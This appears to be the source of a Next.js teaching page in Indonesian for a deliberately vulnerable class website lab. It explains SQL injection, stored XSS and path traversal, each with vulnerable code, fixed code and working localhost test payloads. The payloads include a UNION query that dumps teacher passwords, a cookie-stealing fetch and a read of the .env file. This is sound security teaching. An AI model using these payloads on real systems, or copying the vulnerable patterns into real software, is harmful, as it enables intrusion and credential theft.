import Link from "next/link";
import { KELAS, SECURE_MODE } from "@/lib/config";

export const metadata = {
  title: "Praktikum Keamanan Web",
};

function Code({ children }) {
  return (
    <pre className="mt-3 overflow-x-auto rounded-lg border border-slate-800 bg-slate-950 p-4 font-mono text-xs leading-relaxed text-slate-200">
      {children}
    </pre>
  );
}

function Bagian({ id, nomor, judul, children }) {
  return (
    <section
      id={id}
      className="scroll-mt-24 rounded-xl border border-slate-200 bg-white p-6 sm:p-8"
    >
      <h2 className="flex items-center gap-3 text-xl font-bold text-slate-950 sm:text-2xl">
        <span className="grid h-9 w-9 shrink-0 place-items-center rounded-md border border-blue-100 bg-blue-50 text-sm font-bold text-blue-700">
          {nomor}
        </span>
        {judul}
      </h2>
      <div className="mt-6 space-y-6 text-slate-600 [&_b]:font-semibold [&_b]:text-slate-800 [&_code]:rounded [&_code]:bg-slate-100 [&_code]:px-1 [&_code]:py-0.5 [&_code]:text-slate-800">
        {children}
      </div>
    </section>
  );
}

function Sub({ judul, children }) {
  return (
    <div>
      <h3 className="text-sm font-bold text-slate-900">{judul}</h3>
      <div className="mt-2 leading-7 text-slate-600">{children}</div>
    </div>
  );
}

export default function HalamanPraktikum() {
  return (
    <div className="page-shell py-10 sm:py-14">
      <div className="mx-auto max-w-4xl">
        <header className="max-w-3xl">
          <p className="eyebrow">Panduan pembelajaran</p>
          <h1 className="mt-3 text-3xl font-bold tracking-tight text-slate-950 sm:text-4xl">
            Praktikum Keamanan Web
          </h1>
          <p className="mt-4 leading-7 text-slate-600">
            Website profil kelas {KELAS} ini sekaligus menjadi laboratorium keamanan aplikasi web.
            Pada <b>MODE RENTAN</b>, tiga fitur sengaja dibuat memiliki kelemahan umum agar bisa
            ditemukan, dianalisis, lalu diperbaiki. Dokumentasi lengkap tersedia di file{" "}
            <code className="rounded bg-slate-100 px-1.5 py-0.5 font-mono text-xs text-slate-800">
              docs/ANALISIS-KEAMANAN.md
            </code>{" "}
            dan{" "}
            <code className="rounded bg-slate-100 px-1.5 py-0.5 font-mono text-xs text-slate-800">
              docs/PANDUAN-PRAKTIKUM.md
            </code>
            .
          </p>

          {SECURE_MODE ? (
            <p className="mt-5 rounded-lg border border-emerald-200 bg-emerald-50 p-4 text-sm leading-6 text-emerald-900">
              <b>Mode aman sedang aktif.</b> Semua perbaikan telah diterapkan. Ubah{" "}
              <code className="font-mono">SECURE_MODE=0</code> di file{" "}
              <code className="font-mono">.env</code> lalu restart server untuk kembali ke versi
              rentan dan mencoba serangannya.
            </p>
          ) : (
            <p className="mt-5 rounded-lg border border-amber-200 bg-amber-50 p-4 text-sm leading-6 text-amber-950">
              <b>Mode rentan sedang aktif.</b> Serangan di bawah ini bisa langsung dicoba pada
              lingkungan lokal. Ubah <code className="font-mono">SECURE_MODE=1</code> di file{" "}
              <code className="font-mono">.env</code> lalu restart server untuk mengaktifkan versi
              yang sudah diperbaiki.
            </p>
          )}
        </header>

        <nav
          aria-label="Daftar isi praktikum"
          className="mt-8 rounded-xl border border-slate-200 bg-white p-5"
        >
          <h2 className="text-sm font-bold text-slate-900">Daftar isi</h2>
          <div className="mt-3 grid gap-2 text-sm sm:grid-cols-2">
            <Link
              href="#mengganti-mode"
              className="rounded-md bg-slate-50 px-3 py-2.5 font-medium text-slate-700 hover:bg-slate-100"
            >
              Mengganti mode
            </Link>
            <Link
              href="#a-sql-injection"
              className="rounded-md bg-slate-50 px-3 py-2.5 font-medium text-slate-700 hover:bg-slate-100"
            >
              A. SQL Injection
            </Link>
            <Link
              href="#b-cross-site-scripting-xss"
              className="rounded-md bg-slate-50 px-3 py-2.5 font-medium text-slate-700 hover:bg-slate-100"
            >
              B. Cross-Site Scripting
            </Link>
            <Link
              href="#c-path-traversal"
              className="rounded-md bg-slate-50 px-3 py-2.5 font-medium text-slate-700 hover:bg-slate-100"
            >
              C. Path Traversal
            </Link>
          </div>
        </nav>

        <section
          id="mengganti-mode"
          className="mt-8 scroll-mt-24 rounded-xl border border-slate-200 bg-white p-6"
        >
          <h2 className="text-xl font-bold text-slate-950">Mengganti Mode Rentan dan Aman</h2>
          <p className="mt-2 text-sm leading-6 text-slate-600">
            Kedua versi ada dalam satu codebase. Perbedaannya dikendalikan environment variable{" "}
            <code className="rounded bg-slate-100 px-1.5 py-0.5 font-mono text-xs text-slate-800">
              SECURE_MODE
            </code>
            :
          </p>
          <Code>{`# Versi RENTAN (praktikum) — default
npm run dev

# Versi AMAN (sudah diperbaiki)
npm run dev:aman

# atau via .env
SECURE_MODE=0   # rentan
SECURE_MODE=1   # aman
# lalu restart server`}</Code>
        </section>

      <div className="mt-8 space-y-8">
        {/* ============ A. SQL INJECTION ============ */}
        <Bagian id="a-sql-injection" nomor="A" judul="SQL Injection">
          <Sub judul="Lokasi kerentanan">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>
                Fitur <b>pencarian siswa</b> — halaman <code className="font-mono text-xs">/siswa?q=…</code>{" "}
                dan API <code className="font-mono text-xs">GET /api/siswa/search?q=…</code>
              </li>
              <li>
                Parameter <code className="font-mono text-xs">id</code> pada halaman profil{" "}
                <code className="font-mono text-xs">/siswa/[id]</code>
              </li>
              <li>Kode: <code className="font-mono text-xs">lib/siswa.js</code> → fungsi{" "}
                <code className="font-mono text-xs">cariSiswa()</code>,{" "}
                <code className="font-mono text-xs">getSiswaById()</code>,{" "}
                <code className="font-mono text-xs">tambahKomentar()</code>
              </li>
            </ul>
          </Sub>

          <Sub judul="Penyebab">
            Input pengguna digabung <b>langsung</b> (string concatenation) ke dalam perintah SQL,
            sehingga input dapat mengubah struktur query:
            <Code>{`// ⚠️ RENTAN — lib/siswa.js
const sql = \`SELECT * FROM siswa
  WHERE nama_lengkap LIKE '%\${q}%' OR ... \`;
// q = "' OR 1=1 -- -"  →  WHERE nama_lengkap LIKE '%' OR 1=1 -- -%'
//                                                 ^^^^^^ kondisi baru`}</Code>
          </Sub>

          <Sub judul="Dampak">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>Membocorkan seluruh data siswa tanpa otorisasi.</li>
              <li>
                Dengan <b>UNION SELECT</b>, data tabel lain bisa diambil — di aplikasi ini ada
                tabel <code className="font-mono text-xs">users</code> berisi akun guru dengan
                password.
              </li>
              <li>(Pada konfigurasi lain) mengubah/menghapus data, bahkan mengendalikan server.</li>
            </ul>
          </Sub>

          <Sub judul="Cara menguji (mode rentan)">
            <Code>{`# 1. Boolean-based: tampilkan SEMUA siswa meski kata kunci kosong
curl "http://localhost:3000/api/siswa/search?q=' OR 1=1 -- -"

# 2. UNION-based: mencuri username & password dari tabel users
curl "http://localhost:3000/api/siswa/search?q=' UNION SELECT 1, username, '-', 'XI TKJ 3', password, '', '', '', 'kredensial guru', '' FROM users-- -"

# 3. Error-based: payload rusak → pesan error SQL bocor ke respons
curl "http://localhost:3000/api/siswa/search?q='"`}</Code>
          </Sub>

          <Sub judul="Perbaikan (versi aman)">
            Gunakan <b>parameterized query / prepared statement</b> — input hanya dikirim sebagai
            nilai parameter <code className="font-mono text-xs">(?)</code>, tidak pernah menyusun
            sintaks SQL. Tambahkan pula penanganan error yang tidak membocorkan detail internal.
            <Code>{`// ✅ AMAN — lib/siswa.js
const like = \`%\${q}%\`;
const [rows] = await pool.execute(
  \`SELECT * FROM siswa
     WHERE nama_lengkap LIKE ? OR nama_panggilan LIKE ? OR keahlian LIKE ?\`,
  [like, like, like]   // ← data dipisah dari kode SQL
);`}</Code>
          </Sub>
        </Bagian>

        {/* ============ B. XSS ============ */}
        <Bagian id="b-cross-site-scripting-xss" nomor="B" judul="Cross-Site Scripting (XSS)">
          <Sub judul="Lokasi kerentanan">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>
                Fitur <b>komentar / buku tamu</b> di halaman profil siswa (
                <code className="font-mono text-xs">/siswa/[id]</code>)
              </li>
              <li>
                API: <code className="font-mono text-xs">POST /api/komentar</code> (menyimpan) dan{" "}
                <code className="font-mono text-xs">GET /api/komentar?siswa_id=…</code> (menampilkan)
              </li>
              <li>
                Kode: <code className="font-mono text-xs">lib/siswa.js</code> →{" "}
                <code className="font-mono text-xs">tambahKomentar()</code>;{" "}
                <code className="font-mono text-xs">components/CommentSection.js</code> →{" "}
                <code className="font-mono text-xs">dangerouslySetInnerHTML</code>
              </li>
            </ul>
          </Sub>

          <Sub judul="Penyebab">
            Komentar dari pengguna disimpan <b>mentah tanpa validasi/sanitasi</b>, lalu saat
            ditampilkan kembali dirender sebagai HTML (<code className="font-mono text-xs">dangerouslySetInnerHTML</code>)
            tanpa output encoding. Script milik penyerang ikut dieksekusi browser korban
            (Stored XSS).
            <Code>{`// ⚠️ RENTAN — input disimpan mentah, tanpa validasi & sanitasi
await pool.query(\`INSERT INTO komentar ... VALUES (\${isi})\`);

// ⚠️ RENTAN — output dirender sebagai HTML mentah
<div dangerouslySetInnerHTML={{ __html: komentar.isi }} />`}</Code>
          </Sub>

          <Sub judul="Dampak">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>Mencuri cookie/session atau token pengunjung halaman profil.</li>
              <li>Menipu pengunjung (phishing: form palsu, redirect ke situs jahat).</li>
              <li>Melakukan aksi atas nama korban (mis. mengirim komentar spam otomatis).</li>
            </ul>
          </Sub>

          <Sub judul="Cara menguji (mode rentan)">
            Buka profil siswa mana pun → isi komentar dengan payload → kirim → halaman yang sama
            mengeksekusinya (Stored XSS):
            <Code>{`<img src=x onerror=alert('XSS — Stored')>
<img src=x onerror=fetch('http://localhost:9999?cookie='+document.cookie)>
<script>alert(1)</script>   <\u0021-- via innerHTML tag <script> TIDAK dieksekusi,
                                 itulah kenapa payload img/onerror dipakai -->`}</Code>
            Atau lewat API:
            <Code>{`curl -X POST http://localhost:3000/api/komentar \\
  -H "Content-Type: application/json" \\
  -d '{"siswa_id":1,"penulis":"attacker","isi":"<img src=x onerror=alert(1)>"}'`}</Code>
          </Sub>

          <Sub judul="Perbaikan (versi aman)">
            Pertahanan berlapis: <b>validasi input</b> (panjang wajar), <b>sanitasi</b> (komentar
            tidak mengizinkan HTML sama sekali; untuk rich-text gunakan library seperti DOMPurify),
            <b> parameterized query</b>, dan <b>output encoding</b> — komentar dirender sebagai
            teks biasa sehingga React otomatis meng-escape.
            <Code>{`// ✅ AMAN — server: validasi + sanitasi + parameterized
if (!teks || teks.length > 500) throw new Error("Komentar wajib diisi (maks. 500)");
const tanpaTag = teks.replace(/<[^>]*>/g, ""); // HTML tidak diizinkan
await pool.execute("INSERT INTO komentar ... VALUES (?, ?, ?)", [id, nama, tanpaTag]);

// ✅ AMAN — tampilan: render sebagai TEKS (bukan HTML)
<p>{k.isi}</p>`}</Code>
          </Sub>
        </Bagian>

        {/* ============ C. PATH TRAVERSAL ============ */}
        <Bagian id="c-path-traversal" nomor="C" judul="Path Traversal">
          <Sub judul="Lokasi kerentanan">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>
                Penyaji foto: <code className="font-mono text-xs">GET /api/foto?file=…</code> (dipakai
                foto siswa &amp; foto kelas)
              </li>
              <li>
                Kode: <code className="font-mono text-xs">app/api/foto/route.js</code>
              </li>
            </ul>
          </Sub>

          <Sub judul="Penyebab">
            Aplikasi membentuk path file langsung dari input pengguna tanpa pembatasan direktori
            maupun validasi nama file, sehingga <code className="font-mono text-xs">../</code> bisa
            keluar dari folder foto:
            <Code>{`// ⚠️ RENTAN — app/api/foto/route.js
const file = request.nextUrl.searchParams.get("file");
const filePath = path.join(FOTO_DIR, file);   // tanpa validasi!
const data = await fs.readFile(filePath);      // bisa membaca file mana pun`}</Code>
          </Sub>

          <Sub judul="Dampak">
            Penyerang dapat <b>membaca file sensitif di server</b> yang semestinya tidak bisa
            diakses lewat web: file <code className="font-mono text-xs">.env</code> (isi password
            database), source code, file konfigurasi, hingga file sistem.
          </Sub>

          <Sub judul="Cara menguji (mode rentan)">
            <Code>{`# Membaca file .env project (bocorkan kredensial database)
curl "http://localhost:3000/api/foto?file=..%5C..%5C.env"

# Membaca file source code
curl "http://localhost:3000/api/foto?file=..%5C..%5Cpackage.json"

# Membaca file apa pun di drive server — cukup naikkan ../ sesuai kedalaman folder
curl "http://localhost:3000/api/foto?file=..%5C..%5C..%5C..%5C..%5Cberkas_rahasia.txt"`}</Code>
            <p className="mt-2 text-xs text-slate-500">
              %5C = karakter <code className="font-mono">\</code> yang di-URL-encode. Variasi umum:
              <code className="font-mono"> ....//....//</code>, <code className="font-mono">..%2f..%2f</code>.
            </p>
          </Sub>

          <Sub judul="Perbaikan (versi aman)">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>
                <b>Validasi nama file</b>: wajib nama sederhana (<code className="font-mono text-xs">basename</code>) —
                tolak <code className="font-mono text-xs">../</code>, path absolut, dan dotfile.
              </li>
              <li>
                <b>Whitelist ekstensi</b> gambar (.svg/.png/.jpg/.jpeg/.webp/.gif).
              </li>
              <li>
                <b>Pembatasan direktori</b>: hasil <code className="font-mono text-xs">path.resolve()</code>{" "}
                harus tetap di dalam folder foto.
              </li>
              <li>Pesan error tidak membocorkan path server.</li>
            </ul>
            <Code>{`// ✅ AMAN — app/api/foto/route.js
const nama = path.basename(file);
if (!file || nama !== file || file.includes("..") || nama.startsWith("."))
  return new Response("Nama file tidak diizinkan.", { status: 400 });
if (!MIME[path.extname(nama).toLowerCase()])
  return new Response("Format file tidak diizinkan.", { status: 400 });
const resolved = path.resolve(FOTO_DIR, nama);
if (!resolved.startsWith(FOTO_DIR + path.sep))
  return new Response("Nama file tidak diizinkan.", { status: 400 });
const data = await fs.readFile(resolved);`}</Code>
          </Sub>
        </Bagian>
      </div>

      <aside className="mt-10 rounded-xl border border-blue-200 bg-blue-50 p-5 text-sm leading-6 text-slate-700">
        <b className="text-blue-900">Catatan etika:</b> aplikasi ini hanya untuk latihan di lingkungan
        lokal (localhost) milik kelompok sendiri. Menguji kerentanan pada sistem orang lain tanpa
        izin adalah tindakan ilegal dan melanggar hukum (UU ITE).
      </aside>
      </div>
    </div>
  );
}
